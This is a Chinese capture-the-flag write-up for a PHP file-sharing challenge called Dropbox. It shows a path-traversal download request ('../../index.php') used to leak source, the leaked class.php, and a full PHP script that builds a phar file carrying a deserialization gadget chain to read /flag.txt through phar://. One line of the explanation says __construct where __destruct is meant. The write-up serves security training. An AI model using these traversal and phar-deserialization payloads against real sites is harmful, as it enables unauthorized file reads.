# [CISCN2019 华北赛区 Day1 Web1]Dropbox

[题目地址](https://buuoj.cn/challenges#[CISCN2019%20%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA%20Day1%20Web1]Dropbox)

要配个php环境了，这已经是第二道因为没有php而做不了的题了。

注册登录后可以上传文件。传个普通图片试试水，发现没有回显出文件路径，那就不是文件上传木马题。不过有下载和删除两个选项，有点自娱自乐的感觉。自己传一个文件自己下载，抓包自然是必不可少。发现给download.php发的post有filename参数。这我不得给你改个名字，直接顺着摸到index.php。

```
POST /download.php HTTP/1.1
Host: 24a3d8be-401e-4cc5-8594-cc11d726c068.node4.buuoj.cn:81
Content-Length: 45
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.125 Safari/537.36
Origin: http://24a3d8be-401e-4cc5-8594-cc11d726c068.node4.buuoj.cn:81
Content-Type: application/x-www-form-urlencoded
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://24a3d8be-401e-4cc5-8594-cc11d726c068.node4.buuoj.cn:81/index.php
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: PHPSESSID=5977975f7b9327f32300d794933420b1
Connection: close

filename=../../index.php
```

这个路径我是蒙出来的，上传的文件肯定不可能在网站根目录，大概率在子目录。不过多少层不确定，那就一层一层往上摸上去，看哪里能下载到index.php。而有经验的大佬们直接猜测上传内容在`网站主目录/sandbox/hash`目录下，一步到位。

```php
<?php
session_start();
if (!isset($_SESSION['login'])) {
    header("Location: login.php");
    die();
}
?>


<!DOCTYPE html>
<html>

<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<title>网盘管理</title>

<head>
    <link href="static/css/bootstrap.min.css" rel="stylesheet">
    <link href="static/css/panel.css" rel="stylesheet">
    <script src="static/js/jquery.min.js"></script>
    <script src="static/js/bootstrap.bundle.min.js"></script>
    <script src="static/js/toast.js"></script>
    <script src="static/js/panel.js"></script>
</head>

<body>
    <nav aria-label="breadcrumb">
    <ol class="breadcrumb">
        <li class="breadcrumb-item active">管理面板</li>
        <li class="breadcrumb-item active"><label for="fileInput" class="fileLabel">上传文件</label></li>
        <li class="active ml-auto"><a href="#">你好 <?php echo $_SESSION['username']?></a></li>
    </ol>
</nav>
<input type="file" id="fileInput" class="hidden">
<div class="top" id="toast-container"></div>

<?php
include "class.php";

$a = new FileList($_SESSION['sandbox']);
$a->Name();
$a->Size();
?>
```

这里没啥东西，login.php也挺正常的，没看见sql注入。

```php
<?php
session_start();
if (isset($_SESSION['login'])) {
    header("Location: index.php");
    die();
}
?>

<!doctype html>

<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
  <meta name="description" content="">
  <title>登录</title>

  <!-- Bootstrap core CSS -->
  <link href="static/css/bootstrap.min.css" rel="stylesheet">


  <style>
    .bd-placeholder-img {
      font-size: 1.125rem;
      text-anchor: middle;
    }

    @media (min-width: 768px) {
      .bd-placeholder-img-lg {
        font-size: 3.5rem;
      }
    }
  </style>
  <!-- Custom styles for this template -->
  <link href="static/css/std.css" rel="stylesheet">
</head>

<body class="text-center">
  <form class="form-signin" action="login.php" method="POST">
    <h1 class="h3 mb-3 font-weight-normal">登录</h1>
    <label for="username" class="sr-only">Username</label>
    <input type="text" name="username" class="form-control" placeholder="Username" required autofocus>
    <label for="password" class="sr-only">Password</label>
    <input type="password" name="password" class="form-control" placeholder="Password" required>
    <button class="btn btn-lg btn-primary btn-block" type="submit">提交</button>
    <p class="mt-5 text-muted">还没有账号? <a href="register.php">注册</a></p>
    <p class="text-muted">&copy; 2018-2019</p>
  </form>
  <div class="top" id="toast-container"></div>
</body>

<script src="static/js/jquery.min.js"></script>
<script src="static/js/bootstrap.bundle.min.js"></script>
<script src="static/js/toast.js"></script>
</html>


<?php
include "class.php";

if (isset($_GET['register'])) {
    echo "<script>toast('注册成功', 'info');</script>";
}

if (isset($_POST["username"]) && isset($_POST["password"])) {
    $u = new User();
    $username = (string) $_POST["username"];
    $password = (string) $_POST["password"];
    if (strlen($username) < 20 && $u->verify_user($username, $password)) {
        $_SESSION['login'] = true;
        $_SESSION['username'] = htmlentities($username);
        $sandbox = "uploads/" . sha1($_SESSION['username'] . "sftUahRiTz") . "/";
        if (!is_dir($sandbox)) {
            mkdir($sandbox);
        }
        $_SESSION['sandbox'] = $sandbox;
        echo("<script>window.location.href='index.php';</script>");
        die();
    }
    echo "<script>toast('账号或密码错误', 'warning');</script>";
}
?>
```

这俩文件都包含了class.php，绝对很重要。

```php
<?php
error_reporting(0);
$dbaddr = "127.0.0.1";
$dbuser = "root";
$dbpass = "root";
$dbname = "dropbox";
$db = new mysqli($dbaddr, $dbuser, $dbpass, $dbname);

class User {
    public $db;

    public function __construct() {
        global $db;
        $this->db = $db;
    }

    public function user_exist($username) {
        $stmt = $this->db->prepare("SELECT `username` FROM `users` WHERE `username` = ? LIMIT 1;");
        $stmt->bind_param("s", $username);
        $stmt->execute();
        $stmt->store_result();
        $count = $stmt->num_rows;
        if ($count === 0) {
            return false;
        }
        return true;
    }

    public function add_user($username, $password) {
        if ($this->user_exist($username)) {
            return false;
        }
        $password = sha1($password . "SiAchGHmFx");
        $stmt = $this->db->prepare("INSERT INTO `users` (`id`, `username`, `password`) VALUES (NULL, ?, ?);");
        $stmt->bind_param("ss", $username, $password);
        $stmt->execute();
        return true;
    }

    public function verify_user($username, $password) {
        if (!$this->user_exist($username)) {
            return false;
        }
        $password = sha1($password . "SiAchGHmFx");
        $stmt = $this->db->prepare("SELECT `password` FROM `users` WHERE `username` = ?;");
        $stmt->bind_param("s", $username);
        $stmt->execute();
        $stmt->bind_result($expect);
        $stmt->fetch();
        if (isset($expect) && $expect === $password) {
            return true;
        }
        return false;
    }
    //魔术方法一直都是重头戏，注意这里调用了db的close方法，如果db的值被我们控制了呢？
    public function __destruct() {
        $this->db->close();
    }
}

class FileList {
    private $files;
    private $results;
    private $funcs;

    public function __construct($path) {
        $this->files = array();
        $this->results = array();
        $this->funcs = array();
        $filenames = scandir($path);

        $key = array_search(".", $filenames);
        unset($filenames[$key]);
        $key = array_search("..", $filenames);
        unset($filenames[$key]);

        foreach ($filenames as $filename) {
            $file = new File();
            $file->open($path . $filename);
            array_push($this->files, $file);
            $this->results[$file->name()] = array();
        }
    }
    //又是一个魔术方法，非常奇怪的写法，就算不知道怎么利用也一定能看出来有问题。__call方法的签名是固定的，$func是调用的不存在方法的名字，$args是当时调用的参数
    public function __call($func, $args) {
        array_push($this->funcs, $func);
        //遍历files列表
        foreach ($this->files as $file) {
            //对files列表里的每个file调用func，结果存入results
            $this->results[$file->name()][$func] = $file->$func();
        }
    }

    public function __destruct() {
        $table = '<div id="container" class="container"><div class="table-responsive"><table id="table" class="table table-bordered table-hover sm-font">';
        $table .= '<thead><tr>';
        foreach ($this->funcs as $func) {
            $table .= '<th scope="col" class="text-center">' . htmlentities($func) . '</th>';
        }
        $table .= '<th scope="col" class="text-center">Opt</th>';
        $table .= '</thead><tbody>';
        //__destruct里面会把result里的内容打印出来
        foreach ($this->results as $filename => $result) {
            $table .= '<tr>';
            foreach ($result as $func => $value) {
                $table .= '<td class="text-center">' . htmlentities($value) . '</td>';
            }
            $table .= '<td class="text-center" filename="' . htmlentities($filename) . '"><a href="#" class="download">下载</a> / <a href="#" class="delete">删除</a></td>';
            $table .= '</tr>';
        }
        echo $table;
    }
}

class File {
    public $filename;

    public function open($filename) {
        $this->filename = $filename;
        if (file_exists($filename) && !is_dir($filename)) {
            return true;
        } else {
            return false;
        }
    }

    public function name() {
        return basename($this->filename);
    }

    public function size() {
        $size = filesize($this->filename);
        $units = array(' B', ' KB', ' MB', ' GB', ' TB');
        for ($i = 0; $size >= 1024 && $i < 4; $i++) $size /= 1024;
        return round($size, 2).$units[$i];
    }

    public function detele() {
        unlink($this->filename);
    }
    //File类也有一个和User同名的close方法，是我们的突破点之一
    public function close() {
        return file_get_contents($this->filename);
    }
}
?>
```

其他的源码就不放了，重点几乎都在class.php这个文件里。通过分析代码可知，User类里面的魔法函数__destruct调用了db的close方法，如果我们能把User的db变量改成别的就有事情可以搞了。这里是整道题最难的地方，db默认在__construct里赋值，根本就不是我们能够控制的。如果自己构建一个另外的可以控制的User类，又没法让这个类被程序运行……吗？

反序列化漏洞千千万，php魔法函数占一半。这里这么多莫名其妙的魔法函数，一定是有其用途的。结合网站对上传文件内容过滤十分宽松的漏洞点，我们可以考虑[phar](https://blog.csdn.net/Xxy605/article/details/120101090)，phar有个大名鼎鼎的[phar反序列化漏洞](https://tttang.com/archive/1732/)。反序列化漏洞让我们可以对已有的类构造任意内容，正是我们想要的。

[这里](https://xz.aliyun.com/t/2715)已经讲得很好了。Phar之所以能反序列化，是因为Phar文件会以序列化的形式存储用户自定义的meta-data,PHP使用phar_parse_metadata在解析meta数据时，会调用php_var_unserialize进行反序列化操作。也就是说，我们构建一个phar文件，把想要触发反序列化漏洞的类放入meta-data，然后使用`phar://`伪协议读取phar文件就能触发反序列化漏洞了。使用php制作phar一个脚本搞定([来源](https://cloud.tencent.com/developer/article/1813568))，制作的方法都是固定的，内容不同罢了。

```php
<?php

class User {
    public $db;
}

class File {
    public $filename;
}
class FileList {
    private $files;
    private $results;
    private $funcs;

    public function __construct() {
        $file = new File();
        $file->filename = '/flag.txt';
        $this->files = array($file);
        $this->results = array();
        $this->funcs = array();
    }
}

@unlink("phar.phar");
//创建一个phar对象
$phar = new Phar("phar.phar"); //后缀名必须为phar

$phar->startBuffering();

$phar->setStub("<?php __HALT_COMPILER(); ?>"); //设置stub

$o = new User();
$o->db = new FileList();
//把自定义的user类放入metadata，这个user类的db是FileList
$phar->setMetadata($o); //将自定义的meta-data存入manifest
$phar->addFromString("exp.txt", "test"); //添加要压缩的文件
//签名自动计算
$phar->stopBuffering();
?>
```

运行脚本会生成一个phar文件。现在我们把这个phar文件改成图片后缀名，传上服务器。最后删除刚刚的phar文件，删除时抓包，把filename加个phar://伪协议。（参考[wp](https://www.jianshu.com/p/5b91e0b7f3ac)，到这一步我没法复现了）此时放行包就能看到flag了。

服务器上执行了这一串操作。首先我们删除时抓包，使用phar://伪协议读取刚刚上传的phar文件（虽然phar文件的后缀名是图片的，但是没有影响）。php解析phar文件，触发反序列化漏洞，User类被覆盖为我们构造的那个。User类最后执行`__construct`，调用`$this->db->close();`。但是`$this->db`是FileList类，没有close方法。调用FileList不存在的方法会执行FileList的`__call`方法，对files列表里的每个file调用close方法。巧了，files列表里的每个file属于File类，File类有个close方法，误打误撞调用到了file的close，读取出file的文件内容。我们构造了filename为flag.txt的file，这一举会读取到flag。最后的最后，FileList执行__destruct，把读取的flag内容打印出来。

可能有的疑问是，为什么不直接把User的db设置为File类，直接一步到位调用close？因为close本身只是一个file_get_contents，没有输出结果，故需要利用反序列化漏洞构造一个包含flag的File的FileList的类把原来的覆盖掉，__destruct时输出。